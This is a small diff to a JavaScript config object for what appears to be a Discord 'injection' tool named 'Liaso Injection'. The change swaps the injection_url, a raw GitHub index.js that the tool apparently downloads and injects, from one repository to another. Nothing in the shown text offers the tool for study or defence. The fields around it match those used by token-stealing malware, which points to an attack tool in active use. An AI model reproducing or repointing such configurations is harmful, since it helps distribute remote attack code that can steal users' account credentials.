@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Liaso Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Espiny/Picture/main/image.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Espiny/W/main/index.js', 
   /**
    
    **/
